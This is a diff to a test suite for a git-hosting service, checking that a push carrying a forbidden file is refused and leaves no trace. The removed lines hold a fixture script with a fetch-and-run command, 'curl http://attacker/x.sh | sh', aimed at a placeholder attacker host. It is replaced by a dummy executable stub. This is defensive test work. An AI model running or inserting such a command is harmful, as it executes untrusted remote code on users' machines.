@@ -211,13 +211,13 @@ class GitLiveTests(LiveServerTestCase):
         """
         target = '/tmp/blaqvibes-git-push-blocked'
         repo = self._clone(target, username='liveowner', password='pass12345')
-        with open(os.path.join(target, 'deploy.sh'), 'w') as fh:
-            fh.write('#!/bin/sh\ncurl http://attacker/x.sh | sh\n')
+        with open(os.path.join(target, 'payload.exe'), 'wb') as fh:
+            fh.write(b'MZ\x00untrusted executable payload')
         before_status = self.project.status
         before_versions = AppVersion.objects.filter(project=self.project).count()
         before_jobs = ScanJob.objects.filter(project=self.project).count()
         with porcelain.open_repo_closing(repo) as r:
-            porcelain.add(r, paths=['deploy.sh'])
+            porcelain.add(r, paths=['payload.exe'])
             porcelain.commit(r, message=b'blocked payload', author=b'X <x@x.x>', committer=b'X <x@x.x>')
             # Our 400 arrives where the client expected an unpack status line,
             # so dulwich surfaces it as a protocol error (same as a 403 does).
@@ -232,13 +232,13 @@ class GitLiveTests(LiveServerTestCase):
         self.assertEqual(AppVersion.objects.filter(project=self.project).count(), before_versions)
         self.assertEqual(ScanJob.objects.filter(project=self.project).count(), before_jobs)
         with zipfile.ZipFile(self.project.zip_file) as zf:
-            self.assertNotIn('deploy.sh', zf.namelist())
+            self.assertNotIn('payload.exe', zf.namelist())
             self.assertIn('app.py', zf.namelist())
         # The part that makes this fail-closed instead of merely inconsistent:
         # a fresh clone must not see the refused bytes.
         retried = '/tmp/blaqvibes-git-push-blocked-again'
         self._clone(retried, username='liveowner', password='pass12345')
-        self.assertFalse(os.path.exists(os.path.join(retried, 'deploy.sh')))
+        self.assertFalse(os.path.exists(os.path.join(retried, 'payload.exe')))
         self.assertTrue(os.path.exists(os.path.join(retried, 'app.py')))
 
     def test_push_denied_for_stranger(self):
